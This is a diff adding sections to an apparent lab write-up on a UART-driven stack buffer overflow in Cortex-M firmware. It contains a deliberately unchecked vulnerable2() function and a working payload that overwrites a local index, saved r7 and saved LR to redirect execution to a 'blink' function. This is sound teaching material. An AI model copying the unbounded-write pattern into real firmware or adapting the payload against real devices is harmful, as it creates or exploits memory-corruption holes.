@@ -710,7 +710,248 @@ PC = 0xdeadbeee
 
 ---
 
-## 12. Summary
+## 12. UART-controlled overflow with `vulnerable2()`
+
+After proving the overwrite with a fixed C statement:
+
+```c
+buffer[11] = 0xDEADBEEF;
+```
+
+we moved to a more realistic version: the overwrite comes from UART input.
+
+The idea is no longer:
+
+```text
+program itself writes directly out of bounds
+```
+
+but instead:
+
+```text
+user sends too many 32-bit hex words over UART
+        ↓
+firmware stores each word into a stack buffer
+        ↓
+there is no bounds check
+        ↓
+input words continue past the buffer
+        ↓
+saved r7 and saved LR can be overwritten
+```
+
+This is closer to a real firmware bug, because the vulnerable behavior comes from trusting external input length.
+
+### Simplified vulnerable idea
+
+The relevant idea is:
+
+```c
+__attribute__((noinline))
+static void vulnerable2(void)
+{
+    volatile uint32_t buffer[8];
+    uint32_t i = 0;
+
+    uart_send_string("Enter 32-bit words in hex, end with newline:\r\n");
+
+    while (1) {
+        uint32_t word = uart_read_hex_word();
+
+        buffer[i] = word;
+        i++;
+
+        if (uart_last_char_was_newline()) {
+            uart_send_string("NEWLINE DETECTED\r\n");
+            break;
+        }
+    }
+}
+```
+
+The bug is here:
+
+```c
+buffer[i] = word;
+```
+
+There is no check like:
+
+```c
+if (i < 8) {
+    buffer[i] = word;
+}
+```
+
+So once `i` becomes larger than 7, the writes leave the valid array.
+
+---
+
+## 13. UART payload that successfully redirects control flow
+
+The working payload was:
+
+```text
+11111111 22222222 33333333 44444444 55555555 66666666 77777777 88888888 88888888 00000009 20007ff0 000002e1\r
+```
+
+This payload is a sequence of 32-bit words written by UART into the stack.
+
+A useful way to think about it is:
+
+```text
+11111111  -> buffer[0]
+22222222  -> buffer[1]
+33333333  -> buffer[2]
+44444444  -> buffer[3]
+55555555  -> buffer[4]
+66666666  -> buffer[5]
+77777777  -> buffer[6]
+88888888  -> buffer[7]
+88888888  -> first word after buffer
+00000009  -> overwrite i with a safe expected value
+20007ff0  -> overwrite saved old r7 with a valid-looking old frame pointer
+000002e1  -> overwrite saved LR with blink address | 1
+```
+
+The final word is the most important one:
+
+```text
+000002e1
+```
+
+This is the target function address with the Thumb bit set.
+
+If `blink` is at:
+
+```text
+0x000002e0
+```
+
+then the return address must be:
+
+```text
+0x000002e1
+```
+
+because Cortex-M executes Thumb code and bit 0 must be set in a branch target address.
+
+---
+
+## 14. Why `00000009` is needed in the payload
+
+One important detail is that the overflow does not only overwrite saved `r7` and saved `lr`.
+
+It also overwrites local variables that are still used by the function before it returns.
+
+In `vulnerable2()`, the variable `i` controls the next write:
+
+```c
+buffer[i] = word;
+i++;
+```
+
+If the overflow corrupts `i` with a random value, the next write may jump to a completely different address.
+
+For example, if `i` becomes:
+
+```text
+0xAAAAAAAA
+```
+
+then this line:
+
+```c
+buffer[i] = word;
+```
+
+will try to write very far away from the stack buffer. That can corrupt unrelated memory or trigger a fault before the function reaches its return instruction.
+
+That is why the payload intentionally overwrites `i` with:
+
+```text
+00000009
+```
+
+This keeps `i` close to the expected loop value and avoids destroying the flow too early.
+
+So when building the payload, keep in mind:
+
+```text
+if the payload reaches the local variable i,
+write a value that keeps the next buffer[i] access predictable.
+```
+
+In this experiment, `00000009` worked because it matched the expected progress of the loop at that point.
+
+---
+
+## 15. Stack layout observed with `vulnerable2()`
+
+The useful stack area looked like this:
+
+```text
+0x20007fc0:  11111111  22222222  33333333  44444444
+0x20007fd0:  55555555  66666666  77777777  88888888
+0x20007fe0:  88888888  00000009  20007ff0  000002e1
+```
+
+This can be interpreted as:
+
+```text
+0x20007fc0  buffer[0]
+0x20007fc4  buffer[1]
+0x20007fc8  buffer[2]
+0x20007fcc  buffer[3]
+0x20007fd0  buffer[4]
+0x20007fd4  buffer[5]
+0x20007fd8  buffer[6]
+0x20007fdc  buffer[7]
+0x20007fe0  overflow beyond buffer
+0x20007fe4  overwritten i
+0x20007fe8  saved old r7
+0x20007fec  saved LR
+```
+
+The saved LR slot becomes:
+
+```text
+0x20007fec: 0x000002e1
+```
+
+Then when the function returns, the epilogue restores the saved LR into `pc`.
+
+So instead of returning normally, execution branches to `blink`.
+
+---
+
+## 16. Important lesson from `vulnerable2()`
+
+Compared with the hardcoded overwrite:
+
+```c
+buffer[11] = 0xDEADBEEF;
+```
+
+this UART version is more realistic, but also more sensitive.
+
+The payload must account for every stack word it overwrites:
+
+```text
+buffer data
+extra stack words
+local variables still used by the function
+saved r7
+saved LR
+```
+
+If one of the middle values is wrong, the function may crash before the final return.
+
+That is why stack smashing is not only about reaching saved LR. It is also about keeping the program alive long enough to return through the corrupted saved LR.
+
+---
+
+## 17. Summary
 
 The most important result is:
 
